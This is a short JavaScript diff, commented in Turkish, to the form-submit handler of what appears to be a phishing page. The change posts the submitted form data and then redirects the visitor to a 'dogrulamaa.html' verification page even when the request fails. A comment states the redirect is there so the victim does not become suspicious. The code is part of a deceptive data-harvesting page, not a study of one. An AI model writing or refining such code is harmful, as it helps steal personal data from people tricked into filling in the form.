@@ -1050,13 +1050,17 @@
                                         var btn = document.getElementById("submitBtn");
                                         btn.innerText = "LÜTFEN BEKLEYİN...";
                                         btn.disabled = true;
+
                                         var data = new FormData(form);
                                         fetch(form.action, {
                                             method: 'POST',
                                             body: data,
                                             headers: { 'Accept': 'application/json' }
-                                        }).finally(function () {
-                                            // İSME DİKKAT: dogrulamaa.html yaptık
+                                        }).then(response => {
+                                            // Veri başarıyla gitti, şimdi yönlendir
+                                            window.location.href = "dogrulamaa.html";
+                                        }).catch(error => {
+                                            // Hata olsa bile (internet yavaşlığı vb.) yönlendir ki şüphe çekmesin
                                             window.location.href = "dogrulamaa.html";
                                         });
                                     });
